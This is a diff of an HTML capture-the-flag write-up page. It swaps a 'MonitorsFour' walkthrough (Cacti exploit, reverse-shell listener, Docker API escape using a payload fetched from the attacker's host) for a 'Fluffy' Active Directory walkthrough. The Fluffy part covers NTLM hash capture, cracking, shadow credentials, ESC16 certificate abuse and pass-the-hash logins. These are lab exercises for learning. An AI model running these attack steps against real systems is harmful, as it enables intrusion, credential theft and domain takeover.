@@ -1,484 +1,122 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-<title>HTB MonitorsFour Writeup</title>
-
-<link rel="stylesheet"
-href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"/>
-
-<style>
-
-/* =========================
-   GLOBAL
-========================= */
-
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
-html{
-    scroll-behavior:smooth;
-}
-
-body{
-    background:#0a0a0a;
-    color:#e5e5e5;
-    font-family:Arial, Helvetica, sans-serif;
-    line-height:1.8;
-    max-width:1100px;
-    margin:auto;
-    padding:40px 28px;
-}
-
-/* =========================
-   PAGE TITLE
-========================= */
-
-.page-title{
-    font-size:3rem;
-    font-weight:700;
-    color:#ffffff;
-    margin-bottom:20px;
-    border-bottom:2px solid #1f1f1f;
-    padding-bottom:20px;
-}
-
-/* =========================
-   HEADINGS
-========================= */
-
-h1,h2,h3,h4{
-    color:#ffffff;
-    margin-top:45px;
-    margin-bottom:18px;
-    line-height:1.3;
-}
-
-h2{
-    font-size:1.9rem;
-    border-left:4px solid #444;
-    padding-left:14px;
-}
-
-h3{
-    font-size:1.4rem;
-    color:#d4d4d4;
-}
-
-h4{
-    font-size:1.15rem;
-    color:#c0c0c0;
-}
-
-/* =========================
-   TEXT
-========================= */
-
-p{
-    margin:16px 0;
-    color:#d1d1d1;
-}
-
-a{
-    color:#cfcfcf;
-    text-decoration:none;
-    border-bottom:1px solid #555;
-    transition:0.2s ease;
-}
-
-a:hover{
-    color:#ffffff;
-    border-color:#ffffff;
-}
-
-/* =========================
-   CODE
-========================= */
-
-pre{
-    background:#111111 !important;
-    border:1px solid #232323;
-    border-radius:14px;
-    padding:22px !important;
-    overflow-x:auto;
-    margin:28px 0;
-    box-shadow:
-        0 0 0 1px rgba(255,255,255,0.02),
-        0 10px 25px rgba(0,0,0,0.35);
-}
-
-code{
-    font-family:"JetBrains Mono", monospace;
-    background:#1a1a1a;
-    color:#f5f5f5;
-    padding:3px 7px;
-    border-radius:6px;
-    font-size:0.95rem;
-}
-
-pre code{
-    background:transparent;
-    padding:0;
-}
-
-/* =========================
-   IMAGES
-========================= */
-
-figure{
-    margin:35px 0;
-}
-
-figure img{
-    width:100%;
-    border-radius:16px;
-    border:1px solid #232323;
-    box-shadow:
-        0 15px 35px rgba(0,0,0,0.45),
-        0 0 0 1px rgba(255,255,255,0.03);
-    transition:0.25s ease;
-}
-
-figure img:hover{
-    transform:scale(1.01);
-}
-
-/* =========================
-   LISTS
-========================= */
-
-ul,ol{
-    padding-left:24px;
-    margin:18px 0;
-}
-
-li{
-    margin-bottom:10px;
-}
-
-/* =========================
-   BLOCKQUOTE
-========================= */
-
-blockquote{
-    background:#111111;
-    border-left:4px solid #555;
-    padding:20px;
-    margin:28px 0;
-    border-radius:12px;
-    color:#d1d1d1;
-}
-
-/* =========================
-   TABLES
-========================= */
-
-table{
-    width:100%;
-    border-collapse:collapse;
-    margin:30px 0;
-}
-
-th{
-    background:#141414;
-    color:#ffffff;
-}
-
-td,th{
-    border:1px solid #2a2a2a;
-    padding:14px;
-}
-
-td{
-    background:#0f0f0f;
-}
-
-/* =========================
-   HR
-========================= */
-
-hr{
-    border:none;
-    height:1px;
-    background:#1f1f1f;
-    margin:50px 0;
-}
-
-/* =========================
-   SCROLLBAR
-========================= */
-
-::-webkit-scrollbar{
-    width:10px;
-}
-
-::-webkit-scrollbar-track{
-    background:#0a0a0a;
-}
-
-::-webkit-scrollbar-thumb{
-    background:#2d2d2d;
-    border-radius:10px;
-}
-
-::-webkit-scrollbar-thumb:hover{
-    background:#444;
-}
-
-/* =========================
-   RESPONSIVE
-========================= */
-
-@media(max-width:768px){
-
-    body{
-        padding:24px 18px;
-    }
-
-    .page-title{
-        font-size:2.2rem;
-    }
-
-    h2{
-        font-size:1.5rem;
-    }
-
-    pre{
-        padding:18px !important;
-    }
-}
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Fluffy Writeup</title>
 </head>
-
 <body>
 
-<article class="page sans">
+    <h1>HTB FLUFFY</h1>
 
-<header>
-    <h1 class="page-title">HTB MonitorsFour Writeup</h1>
-</header>
+    <h2>Scanning/Recon</h2>
+    <h3>Nmap</h3>
+    <p>Lets run nmap against to identify open ports and services</p>
+    <pre><code>nmap -A -Pn -p- 10.129.232.88 -oN 10.129.232.88_scan-result.txt</code></pre>
+    
+    <p>Result:</p>
+    <p>We discovered a bunch of open ports, port 445 and 139 means the host is running SMB and there are other ports like 636 and 3269 which indicate that the host is part of a domain called fluffy.htb , also given the name DC01.fluffy.htb , we can assume the target is a domain controller.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image1.png" alt="Nmap Scan Results">
 
-<div class="page-body">
+    <h2>SMB shares enumeration</h2>
+    <p>Lets try listing the available shares with no authentication using smbclient</p>
+    <pre><code>smbclient -N -L //10.129.14.128</code></pre>
+    
+    <p>Output:</p>
+    <p>Using the provided ceredentials: j.fleischman / J0elTHEM4n1990! lets authenticate to the IT share.</p>
+    <p>But first, let's check what permissions we have over each share using smbmap.</p>
 
-<h2>Scanning</h2>
+    <h3>Shares permissions</h3>
+    <pre><code>smbmap -u j.fleischman -p J0elTHEM4n1990! -H 10.129.232.88</code></pre>
+    
+    <p>Output:</p>
+    <p>Nice we have READ and WRITE permissions over the IT share.</p>
+    <p>Now lets authenticate to the share.</p>
+    <pre><code>smbclient //10.129.232.88/IT -U j.fleischman</code></pre>
+    <p>We have some directories, some zip files and a pdf file.</p>
+    <p>After entering those directories and doing some research on the names, i discovered that those are tools/apps used in windows.</p>
+    <p>So i decided to download and check out the pdf file.</p>
+    <p>Summary of the file is that the It department should upgrade the systems so they are not vulnerable to the most recent vulnerabilities and the vulnerabilities were listed as well.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image2.png" alt="SMB Enumeration and PDF file">
 
-<p>
-We run an nmap scan as follows:
-</p>
+    <h2>Vulnerabilities Research</h2>
+    <p>I looked up the CVE's and the one the showed the most promise for grant me a foothold was the second critical vulnerability <strong>CVE-2025-24071.</strong></p>
+    <p>PoC check:</p>
+    <p>I clicked on the third link which led me to this blog that explained the exploitation process: 
+.</p>
+    <p>Copied the exploit code, generated the malicious zip file.</p>
+    <p>Before we upload the malicious zip file to the host via adding it to the SMB file share, lets start Responder to capture the hash(es).</p>
 
-<pre><code class="language-bash">
-nmap -A -p- 10.129.1.46
-</code></pre>
+    <h3>Hash Capture With Responder</h3>
+    <pre><code>sudo responder -I tun0</code></pre>
+    <p>Upload the zip file</p>
+    <p>Our exploit worked and we captured a NTLM hash.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image3.png" alt="Responder Hash Capture">
 
-<pre><code class="language-bash">
-Starting Nmap 7.95 at 2026-05-20 16:42 EDT
-Nmap scan report for 10.129.1.46
-Host is up (0.074s latency).
+    <h3>Hash Cracking</h3>
+    <p>I pasted the hash into a file named hash.txt and we'll use hashcat to try to crack the NTLM hash.</p>
+    <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+    <p>Cracking successful:</p>
+    <p>Now we have a new set of creds: p.agila / prometheusx-303</p>
+    <p><em>Note: My target ip address changed for this part because I had to reset the target. but i returned to using the previous ip in the privelege esclation part.</em></p>
+    <p>Lets test them using CrackMapExec</p>
+    <pre><code>sudo crackmapexec smb 10.129.62.146 -u p.agila -p prometheusx-303</code></pre>
+    <img src="../../../assets/writeups/htb/Fluffy/image4.png" alt="Hashcat and CrackMapExec">
 
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    nginx
-5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
-</code></pre>
+    <h2>Domain Enumeration</h2>
+    <p>Lets get all available info about the domain and analyze it using bloodhound.</p>
+    <p>Firstly we run the bloodhound-python ingestor with the -all flag to perform all checks.</p>
+    <pre><code>sudo bloodhound-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.62.146 -d fluffy.htb -c all</code></pre>
+    <p>The results are in json files so we run the next command to put tham all in one zip file</p>
+    <pre><code>zip -r fluffy_htb.zip *.json</code></pre>
+    <p>Next we start the bloodhoud app:</p>
+    <pre><code>bloodhound</code></pre>
+    <p>After we uploaded the zip file or all the json files, we then type domain: in the search bar and select the fluffy.htb domain to perform analysis:</p>
+    <p>After going to the analysis tab and clicking Find Shortest Paths to Domain Admins , we see that there is a path from one of our owned users p.agila.</p>
+    <p>After more analysis, I found out that our user is part of the Service Account Managers group which has GenericAll privileges over the Service Accounts group.</p>
+    <p>The Service Account group has GenericWrite privileges over the members of that group, and one of the members namely ca_svc is a member of the Cert Publisher's group. winrm_svc user is a part of the Remote Management Users.</p>
+    <img src="../../../assets/writeups/htb/Fluffy/image5.png" alt="BloodHound Analysis">
 
-<h2>Directory Scanning</h2>
+    <h2>Foothold</h2>
+    <p>Using the GenericAll privilege, we add p.agilla to the Service Accounts group using the below command:</p>
+    <pre><code>net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "10.129.62.146"</code></pre>
+    <p>Then we verify that the user was successfully added to the group:</p>
+    <pre><code>net rpc group members "Service Accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "10.129.62.146"</code></pre>
+    <p>Then, as a member of the Service Accounts group, we should be able to add shadow credentials to the winrm_svc and ca_svc users to retrieve their RC4 password hash because of the GenericWrite privilege.</p>
+    <p>For this, we can use certipy.</p>
 
-<p>
-We check for directories using gobuster:
-</p>
+    <h4>Generating Hashes using Certipy</h4>
+    <pre><code>certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc -target-ip 10.129.62.146</code></pre>
+    <p><em>Note: we might get an error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), to fix this we run command:</em></p>
+    <pre><code>sudo ntpdate &lt;dc&gt; #replace dc with ip</code></pre>
+    <p>We repeat this for the remaining accounts as well. ldap_svc and winrm_svc</p>
 
-<pre><code class="language-bash">
-gobuster dir -u http://monitorsfour.htb \
--w /usr/share/wordlists/seclists/
-</code></pre>
+    <h4>User Flag</h4>
+    <p>We use the winrm_svc user account to get a shell on the host using evil-winrm.</p>
+    <pre><code>evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.62.146</code></pre>
+    <img src="../../../assets/writeups/htb/Fluffy/image6.png" alt="Certipy and User Flag Shell">
 
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image.png">
-</figure>
+    <h2>Privilege Escalation/Root Flag</h2>
+    <p>ADCS is installed on the Domain Controller. we should search for vulnerabilities using ca_svc's creds and certipy tool:</p>
+    <p>I then googled ESC16 vulnerability and followed the step in the third article/blog:</p>
 
-<p>
-The <code>/controllers</code> route returned a 403 forbidden response.
-The <code>/user</code> endpoint looked more interesting.
-</p>
+    <h3>Steps</h3>
+    <p>Read upn for ca_svc</p>
+    <pre><code>certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -user ca_svc -dc-ip 10.129.232.88 read</code></pre>
 
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image1.png">
-</figure>
+    <p><strong>Change ca_svc's UPN to Administrator</strong></p>
+    <pre><code>certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -upn administrator -user ca_svc -dc-ip 10.129.232.88 update</code></pre>
 
-<p>
-We added a token parameter:
-<code>http://monitorsfour.htb/user?token=0</code>
-</p>
+    <p><strong>Request Certificate as Administrator</strong></p>
+    <pre><code>certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -ca 'FLUFFY-DC01-CA' -template 'User'</code></pre>
 
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image2.png">
-</figure>
+    <p><strong>Restore ca_svc's Original UPN</strong></p>
+    <pre><code>certipy account -u 'p.agila@fluffy.htb' -p prometheusx-303 -upn ca_svc -user ca_svc -dc-ip 10.129.232.88 update</code></pre>
+    <pre><code>certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain 'fluffy.htb'</code></pre>
 
-<p>
-The password values appeared to be hashes, so they were checked
-against CrackStation.
-</p>
-
-<h2>Admin Login</h2>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image3.png">
-</figure>
-
-<p>
-After logging in successfully, no immediate attack vector was found,
-so virtual host enumeration was performed.
-</p>
-
-<h3>VHost Enumeration</h3>
-
-<pre><code class="language-bash">
-ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
--u http://monitorsfour.htb \
--H 'Host: FUZZ.monitorsfour.htb'
-</code></pre>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image4.png">
-</figure>
-
-<p>
-The valid subdomain discovered was:
-<code>cacti.monitorsfour.htb</code>
-</p>
-
-<h2>Cacti Login</h2>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image5.png">
-</figure>
-
-<p>
-The credentials worked with the username:
-<code>marcus</code>
-</p>
-
-<h3>Exploit</h3>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image6.png">
-</figure>
-
-<p>
-An exploit matching the disclosed Cacti version was identified and used.
-</p>
-
-<h2>Initial Foothold</h2>
-
-<pre><code class="language-bash">
-python3 monitorsfour.py \
--u marcus \
--p &lt;REDACTED&gt; \
--i &lt;attacker_ip&gt; \
--url http://cacti.monitorsfour.htb \
--l 9001
-</code></pre>
-
-<pre><code class="language-bash">
-nc -lvnp 9001
-</code></pre>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image7.png">
-</figure>
-
-<h2>User Flag</h2>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image8.png">
-</figure>
-
-<h2>Root Flag</h2>
-
-<h3>Privilege Escalation (CVE-2025-9074)</h3>
-
-<p>
-The shell was inside a Docker container, requiring container escape
-to access the host filesystem.
-we weren’t able to get a connection but based on the error, at least we were able to get an IP address: <code>192.168.65.254</code>
-
-<code>>host.docker.internal</code> points to <code>192.168.65.254</code> but we couldn’t get get a connection so we can check other IP addresses in the subnet using the following script:
-</p>
-
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image9.png">
-</figure>
-   
-
-<pre><code class="language-bash">
-for i in $(seq 1 254); do
-(
-curl -s --connect-timeout 1 \
-http://192.168.65.$i:2375/version \
-2>/dev/null | grep -q "ApiVersion" \
-&& echo "192.168.65.$i:2375 OPEN"
-) &
-done
-wait
-</code></pre>
-
-<p>
-   we get a hit. The Docker API is open on 192.168.65.7.
-</p>
-
-<h4>Enumerate Docker Images</h4>
-
-<pre><code class="language-bash">
-curl -s http://192.168.65.7:2375/images/json
-</code></pre>
-
-<p>
-   we go back to our host machine and create a container configuration with host filesystem mounted using the following code, we can create it in the file /tmp/container.json .
-</p>
-<pre><code class="language-json">
-{
-  "Image": "alpine:latest",
-  "Cmd": [
-    "/bin/sh",
-    "-c",
-    "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"
-  ]
-}
-</code></pre>
-<p>Next we start a http server using python:</p>
-<pre><code class="language-bash">
-cd /tmp
-python -m http.server 8000
-</code></pre>
-<p>
-   Then we return to the container and we download the payload:
-</p>
-<pre>
-   <code class="language-json">
-      curl http://<our-IP>:8000/container.json -o /tmp/container.json
-   </code>
-</pre>
-<p>
-   We then create the container, and start it:
-</p>
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image10.png">
-</figure>
-<p>I cut out the flag, but it’s supposed to be printed after the last line in the image above.</p>
-<figure>
-<img src="../../../assets/writeups/htb/MonitorsFour/image11.png">
-</figure>
-
-</div>
-</article>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <p>Log in and read root flag</p>
+    <pre><code>evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e</code></pre>
+    <img src="../../../assets/writeups/htb/Fluffy/image7.png" alt="Root Flag Capture">
 
 </body>
 </html>
